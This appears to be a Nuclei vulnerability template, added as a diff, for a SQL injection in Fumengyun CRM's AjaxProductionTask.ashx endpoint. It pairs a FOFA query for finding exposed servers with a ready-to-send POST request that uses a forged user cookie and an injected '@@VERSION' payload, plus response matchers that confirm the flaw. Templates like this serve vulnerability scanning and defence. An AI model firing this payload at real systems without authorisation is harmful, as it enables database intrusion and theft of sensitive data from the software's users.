@@ -1,0 +1,29 @@
+id: fumengyun-crm-ajaxproductiontask-ashx-sql-injection
+info:
+  name: 孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+    上海孚盟软件有限公司提供外贸SaaS服务及行业解决方案。其孚盟云CRM系统中AjaxProductionTask.ashx接口存在SQL注入缺陷，攻击者可利用该漏洞执行恶意SQL语句，导致数据库敏感信息泄露，并在具备高权限条件下实现服务器代码执行或权限提升。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxProductionTask.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1","corpId": "1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=getProductionList&poNo='-1/@@VERSION--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
